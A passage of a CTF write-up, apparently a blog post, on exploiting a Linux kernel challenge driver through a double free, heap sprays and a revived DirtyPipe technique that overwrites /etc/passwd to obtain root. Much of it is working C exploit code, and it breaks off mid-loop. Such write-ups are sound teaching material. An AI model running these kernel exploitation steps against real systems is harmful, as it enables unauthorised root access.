+<p>Ultimately, I was hoping to somehow control RIP the ✨ classic ✨ way with a double free &ndash; free the first time, spray struct pipe_buffer objects, free the second time, spray something like msg_msgseg or sk_buff to get a kernel text leak (assuming I get a kernel heap leak via some similar method by overlapping msg_msg with msg_msgseg) and then overwrite pipe_buf_operations with a JOP gadget that will then lead on to stack pivot and a ROP chain. However, we did have some weird stuff happen while trying to spray pipe_buf.</p>
+<p>For reference, struct pipe_buffer is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> pipe_buffer {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> page <span style="color:#f92672">*</span>page;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> offset, len;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pipe_buf_operations <span style="color:#f92672">*</span>ops;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> flags;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> private;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>struct pipe_buffer is allocated in kmalloc-cg-1k, and typically looks like this in memory:</p>
+<p><img src="/images/palindromatic_pipe_buf_normal.jpg" alt="Normal pipe_buf object in memory"></p>
+<p>And the way that I sprayed pipe_buf was as such:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_PIPEFDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">pipe</span>(pipefd[i]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">write</span>(pipefd[i][<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;ABC&#34;</span>, <span style="color:#ae81ff">3</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] write&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>However, we were getting this object instead of the expected pipe_buf object while doing our cross cache:</p>
+<p><img src="/images/palindromatic_pipe_buf_weird.jpg" alt="Weird pipe_buf object in memory"></p>
+<p>After some investigation, I finally managed to find out what object this is. According to <a href="https://www.interruptlabs.co.uk/articles/pipe-buffer">https://www.interruptlabs.co.uk/articles/pipe-buffer</a>, when a pipe_buffer is allocated, and data is written to a pipe, a page (size 4096) will be used by the kernel to store data for the pipe. So instead of cross caching to a pipe_buffer object, it cross cached to the page used to store data by the pipe :o</p>
+<p>Interestingly, if we wrote less than 9 bytes to the pipe, as the pages are not zeroed out before being reallocated, the magic value would remain intact. As such, if the victim object was reallocated to this page object used by the pipe to store data, technically we could still free the very same object via reap, as the magic value would be untouched.</p>
+<p>So after freeing the victim object for the first time and allocating this pipe_buf page object over the victim object, we can free the victim objecct a second time via reap. After doing so, I tried to spray msg_msg or msg_msgseg over the victim object to see if I could get a kernel text leak, but then the next weird thing happened.</p>
+<p><img src="/images/palindromatic_msg_weird.png" alt="Weird msg object"></p>
+<p>Instead of a msg_msg or msg_msgseg object, I was getting this object that was full of 0x1s. I later figured out that this is likely to be the object allocated by selinux, which the security pointer in struct msg_msg points to.</p>
+<p>While trying to fix the cross cache sprays, I was wondering why the heap sprays were so unstable (and object didn&rsquo;t go where I wanted them to go), so I decided to take a look at /proc/slabinfo (I actually only realized that .config was provided after the CTF was over 😅). I then noticed that the normal cg caches were missing, and that they were seemingly replaced by these strange rnd caches:</p>
+<p><img src="/images/palindromatic_caches.jpg" alt="Caches"></p>
+<p>I googled and realized that this was actually some kind of new kernel protection <code>CONFIG_RANDOM_KMALLOC_CACHES</code>, which aimed to make it more annoying for attackers to perform a reliable heap spray. This is a good article about it: <a href="https://sam4k.com/exploring-linux-random-kmalloc-caches/#introducing-random-kmalloc-caches">https://sam4k.com/exploring-linux-random-kmalloc-caches/#introducing-random-kmalloc-caches</a>, but in summary, multiple (usually 16) slab caches are introduced for each size. When an object is allocated via kmalloc, it will go into one of the 16 caches randomly based on where kmalloc is called and a per-boot generated seed. This means that our spray will be distributed amongst these 16 slab caches randomly. How annoying!</p>
+<p>The solution to this is actually simply to just spray even more objects; and hope that one of them reclaim the freed victim object.</p>
+<p>At this point, we finally managed to stabilize the pipe_buffer spray, but now that the actual struct pipe_buffer reclaimed the victim object instead of the data page, the magic value was destroyed. This also destroyed my hopes for the second free, as with the magic value corrupted, reap would not work :&quot;(</p>
+<h4 id="the-actual-proper-way-to-double-free">The Actual Proper Way To Double Free</h4>
+<p>There is actually a way not to get roadblocked by the magic value! The solution was as such:</p>
+<ul>
+<li>Process the corrupted request so that it is added once to the outgoing queue</li>
+<li>Reset the corrupted request (since it is not removed from the incoming queue, so operations can still be performed on it) so that it moved back to the top of the incoming queue</li>
+<li>Process all the other requests in the incoming queue &ndash; at this point, the incoming queue would only have 0x0 and the address of the corrupted request object</li>
+<li>Reap to free all objects in the outgoing queue including the corrupted object</li>
+<li>Spray pipe_buffer objects over the corrupted object</li>
+<li>Reset twice to cause a double free on the corrupted object</li>
+<li>Spray another round of pipe_buffer objects to reclaim the victim object</li>
+</ul>
+<p>Technically with this reset method, the magic value would not matter at all, which means we could actually do a classic pipe_buf_operations overwrite 🤔 but that would also mean needing to fiddle with a ROP chain, which can be pretty annoying :&lt;</p>
+<p>This is how it can be done in the exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;STAGE 1: TRIGGER DOUBLE FREE</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Do queue 0x100 times</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">0x41</span>, <span style="color:#66d9ef">sizeof</span>(buf)); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x100</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">do_queue</span>(buf);
+</span></span><span style="display:flex;"><span>    } 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Do process 0x30 times</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x30</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">do_process</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Do sanitize</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">do_sanitize</span>(); 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Do process 0x10 times</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x10</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        count_old <span style="color:#f92672">=</span> count_new; 
+</span></span><span style="display:flex;"><span>        count_new <span style="color:#f92672">=</span> <span style="color:#a6e22e">do_query</span>() <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (count_new <span style="color:#f92672">==</span> count_old) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>; 
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            offset <span style="color:#f92672">=</span> offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>; 
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">do_process</span>(); 
+</span></span><span style="display:flex;"><span>    } 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Offset: %x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, offset); 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Do reset to move corrupted request into incoming queue</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">do_reset</span>(); 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Process all the other incoming requests</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> (<span style="color:#ae81ff">0x100</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span><span style="color:#f92672">-</span>offset); i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">do_process</span>(); 
+</span></span><span style="display:flex;"><span>    }   
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// STAGE 2: CROSS CACHE
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;STAGE 2: CROSS CACHE</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Do reap to free all items in the outgoing queue</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x100</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">do_reap</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying pipe_buf over freed 1024 area</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_PIPEFDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">pipe</span>(pipefd[i]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        } 
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_PIPEFDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">write</span>(pipefd[i][<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;BBBB&#34;</span>, <span style="color:#ae81ff">4</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] write&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }  
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);  
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Free a second time using reset</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">do_reset</span>(); 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">do_reset</span>(); 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spray another round of pipe_buf to replace double freed object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> NUM_PIPEFDS; i <span style="color:#f92672">&lt;</span> NUM_PIPEFDS<span style="color:#f92672">+</span><span style="color:#ae81ff">0x60</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">pipe</span>(pipefd[i]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        } 
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> NUM_PIPEFDS; i <span style="color:#f92672">&lt;</span> NUM_PIPEFDS<span style="color:#f92672">+</span><span style="color:#ae81ff">0x60</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">write</span>(pipefd[i][<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;CCCC&#34;</span>, <span style="color:#ae81ff">4</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] write&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }  
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>); 
+</span></span></code></pre></div><p>When this is done, two of the pipefds will be pointing to the same object: one in the spray of NUM_PIPEFDS (0x200) objects (where &ldquo;BBBB&rdquo; was written), and another in the second part of the spray where 0x60 objects were sprayed (where &ldquo;CCCC&rdquo; was written).</p>
+<p>Technically, when we read from the first part of the spray, we should only be reading &ldquo;B&quot;s; however, if we encounter the victim object, we would be reading &ldquo;C&quot;s as the original pipe_buffer sprayed over the victim object in the first part of the spray has been overwritten by a pipe_buffer object sprayed in the second part of the spray. To determine which pipefd contains the victim object, all we need to do is to read from all the pipes in the first half of the spray and see which one contains &ldquo;C&quot;s.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Find the corrupted pipe_buf object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_PIPEFDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>stuff, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(stuff)); 
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">read</span>(pipefd[i][<span style="color:#ae81ff">0</span>], <span style="color:#f92672">&amp;</span>stuff, <span style="color:#ae81ff">2</span>); 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (stuff[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x43</span>) {
+</span></span><span style="display:flex;"><span>            corrupted <span style="color:#f92672">=</span> i; 
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (corrupted <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] Pipe corruption failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>); 
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Corrupted pipe index: %x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, corrupted); 
+</span></span></code></pre></div><p>We can then free the victim object by closing all the pipes in the second half of the spray, and reclaiming the victim object by spraying msg_msgseg:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Free one of the two pipe_bufs over the victim</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_PIPEFDS<span style="color:#f92672">+</span><span style="color:#ae81ff">0x60</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (i <span style="color:#f92672">==</span> corrupted) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(pipefd[i][<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(pipefd[i][<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying msg_msgseg over victim object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_MSQIDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>secondary_msg, <span style="color:#ae81ff">0x5a</span>, <span style="color:#66d9ef">sizeof</span>(secondary_msg));
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>secondary_msg.mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x41</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>secondary_msg.mtext[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> MSG_TAG;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>secondary_msg.mtext[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> i;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgsnd</span>(msqid[i], <span style="color:#f92672">&amp;</span>secondary_msg, <span style="color:#66d9ef">sizeof</span>(secondary_msg) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msg_msg spray failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>); 
+</span></span></code></pre></div><h4 id="dirtypipe">DirtyPipe</h4>
+<p>DirtyPipe (CVE-2022-0847) is a vulnerability in the Linux Kernel discovered by Max Kellermann, who wrote a really interesting story about how he found the bug here: <a href="https://dirtypipe.cm4all.com/">https://dirtypipe.cm4all.com/</a>. DirtyPipe has since been patched, however the author of the challenge found an article about how this technique could be revived given some primitive: <a href="https://github.com/veritas501/pipe-primitive">https://github.com/veritas501/pipe-primitive</a>.</p>
+<p>A struct pipe_buffer can have the following flags:</p>
+<pre tabindex="0"><code>#define PIPE_BUF_FLAG_LRU	0x01	/* page is on the LRU */
+#define PIPE_BUF_FLAG_ATOMIC	0x02	/* was atomically mapped */
+#define PIPE_BUF_FLAG_GIFT	0x04	/* page is a gift */
+#define PIPE_BUF_FLAG_PACKET	0x08	/* read() as a packet */
+#define PIPE_BUF_FLAG_CAN_MERGE	0x10	/* can merge buffers */
+#define PIPE_BUF_FLAG_WHOLE	0x20	/* read() must return entire buffer or error */
+</code></pre><p>The flag PIPE_BUF_FLAG_CAN_MERGE is critical to this CVE. In the kernel, even though each pipe_buffer object is 40 bytes, it is allocated in the kmalloc-cg-1024 cache (rnd in this case), because the pipe_buffers are allocated as an array of pipe_buffers by kcalloc. Each pipe_buffer would then refer to a page in the page cache which stores its data.</p>
+<p>When a write is performed to the pipe that does not completely fill the page, it would be appended to the existing page instead of allocating a new one. These buffers would be marked with the PIPE_BUF_FLAG_CAN_MERGE flag. When data is read from the pipe, the PIPE_BUF_FLAG_CAN_MERGE flag is not unset.</p>
+<p>Another optimization that the kernel has is the ability to <a href="https://man7.org/linux/man-pages/man2/splice.2.html">splice</a>, which transfers data between 2 file descriptors (of which one is a pipe) without copying between userland and kernel land. Splicing is a zero copy operation, and when a file is spliced, a new pipe_buffer object is added to the ring, where the page pointer points inside the page cache to the page containing data from the file. Now, if the pipe has the PIPE_BUF_FLAG_CAN_MERGE flag, data written to the pipe would be written to that page, which would give us an arbitrary write to the cached page of the file that was spliced.</p>
+<p>In the original DirtyPipe exploit, Max showed that it was possible to perform an arbitrary write to any file via the following steps:</p>
+<ol>
+<li>Create a pipe</li>
+<li>Fill the pipe with arbitrary data such that the PIPE_BUF_FLAG_CAN_MERGE flag was set</li>
+<li>Drain the pipe by reading from it (but the PIPE_BUF_FLAG_CAN_MERGE flag remains set as it is not zeroed out)</li>
+<li>Splice data from the target file (e.g. /etc/passwd) to the pipe &ndash; the condition is that we must have read access to the file</li>
+<li>Write arbitrary data to the pipe &ndash; this would overwrite data in the cached page of the file</li>
+</ol>
+<p>Now, back to the challenge. While the kernel version (6.7.5) is super new and is patched against the original DirtyPipe CVE, it is possible to revive this technique with the primitives we have. In short, we can:</p>
+<ol>
+<li>Splice our target file (/etc/passwd) over the msg_msgseg object, which would allow us to leak the new pipe_buffer object added to the ring</li>
+<li>Free the original msg_msgseg used for reading</li>
+<li>Spray a modified pipe_buffer object, where the PIPE_BUF_FLAG_CAN_MERGE flag has been set</li>
+<li>Create a new nice little password for the root user and write it to the /etc/passwd file</li>
+<li>Fork, login, and profit $$$</li>
+</ol>
+<p>This was the author&rsquo;s solution to this challenge, which I find really cool :D</p>
+<p>To splice the /etc/passwd file to the victim pipe, we can do the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Splice pipe</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">loff_t</span> off <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">splice</span>(passwd, <span style="color:#f92672">&amp;</span>off, pipefd[corrupted][<span style="color:#ae81ff">1</span>], NULL, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] Splice failed&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>We then leak the pipe_buffer object by reading from the msg_msgseg object. To read from msg_msg without freeing the objects, MSG_COPY can be used. We will copy the leak into a fake pipe_buffer object, but with the PIPE_BUF_FLAG_CAN_MERGE flag set.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Getting a leak of the pipe_buffer object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_MSQIDS; i<span style="color:#f92672">++</span>) {
